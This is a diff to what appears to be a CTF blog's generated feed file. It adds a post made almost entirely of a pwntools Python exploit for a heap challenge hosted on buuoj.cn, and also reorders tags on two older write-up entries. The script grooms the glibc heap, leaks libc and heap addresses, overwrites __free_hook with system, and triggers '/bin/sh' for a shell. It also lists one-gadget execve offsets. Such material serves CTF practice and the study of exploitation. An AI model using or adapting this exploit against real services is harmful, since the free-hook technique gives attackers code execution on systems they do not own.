@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>last_remainder</title>
+      <link href="/2019/12/12/last-remainder/"/>
+      <url>/2019/12/12/last-remainder/</url>
+      
+        <content type="html"><![CDATA[<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> requests<span class="hljs-comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span>file_name = <span class="hljs-string">'./pwn1'</span>libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>ip = <span class="hljs-string">'node3.buuoj.cn'</span>port = <span class="hljs-string">'26364'</span>context.arch = <span class="hljs-string">'amd64'</span><span class="hljs-comment"># context.log_level='debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]libc = ELF(libc_name)elf = ELF(file_name)p = process(file_name)li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)<span class="hljs-string">'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL'''</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"length&gt; "</span>,str(size))p.sendlineafter(<span class="hljs-string">"content&gt; "</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">2</span>))p.sendlineafter(<span class="hljs-string">"index&gt; "</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">3</span>))p.sendlineafter(<span class="hljs-string">"index&gt; "</span>,str(idx))fkchunk = <span class="hljs-string">"/bin/sh||aaaaaaa\x31"</span>p.sendlineafter(<span class="hljs-string">"name&gt; "</span>,fkchunk)add(<span class="hljs-number">0xf8</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#A 0</span>add(<span class="hljs-number">0x1f8</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#B 1</span>add(<span class="hljs-number">0xf8</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#C 2</span>free(<span class="hljs-number">1</span>)free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x100</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#A 0</span>add(<span class="hljs-number">0x78</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B1 1</span>add(<span class="hljs-number">0x108</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#B2 3</span>add(<span class="hljs-number">0x8</span>,  <span class="hljs-string">""</span>) <span class="hljs-comment">#B3 4</span>add(<span class="hljs-number">0x18</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B4 5</span>free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">0x78</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B1 1</span>add(<span class="hljs-number">0x108</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#B2 2</span>add(<span class="hljs-number">0x8</span>,  <span class="hljs-string">""</span>) <span class="hljs-comment">#B3 6</span>add(<span class="hljs-number">0x18</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B4 7</span>add(<span class="hljs-number">0x10</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#8</span>add(<span class="hljs-number">0x18</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#9</span><span class="hljs-comment"># add(0x18, "")</span>free(<span class="hljs-number">3</span>)show(<span class="hljs-number">2</span>)libc.address = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-3951480</span>ls(<span class="hljs-string">"libc addr"</span>,libc.address)free(<span class="hljs-number">8</span>)free(<span class="hljs-number">4</span>)show(<span class="hljs-number">6</span>)heap_addr = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-928</span>+<span class="hljs-number">0x18</span>ls(<span class="hljs-string">"heap addr"</span>,heap_addr)free(<span class="hljs-number">5</span>)free(<span class="hljs-number">9</span>)free(<span class="hljs-number">7</span>)add(<span class="hljs-number">0x20</span>, p64(heap_addr)) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>+p64(libc.symbols[<span class="hljs-string">'__free_hook'</span>]))p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">4</span>))p.sendlineafter(<span class="hljs-string">"remarks&gt;"</span>,p64(libc.symbols[<span class="hljs-string">'system'</span>]))gdb.attach(p)p.interactive()</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> heap </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SWPUCTF 2019 write up</title>
       <link href="/2019/12/09/SWPUCTF-2019-write-up-md/"/>
       <url>/2019/12/09/SWPUCTF-2019-write-up-md/</url>
@@ -20,9 +39,9 @@
       
         <tags>
             
-            <tag> write up </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> write up </tag>
             
         </tags>
       
@@ -47,9 +66,9 @@
       
         <tags>
             
-            <tag> write up </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> write up </tag>
             
         </tags>
       
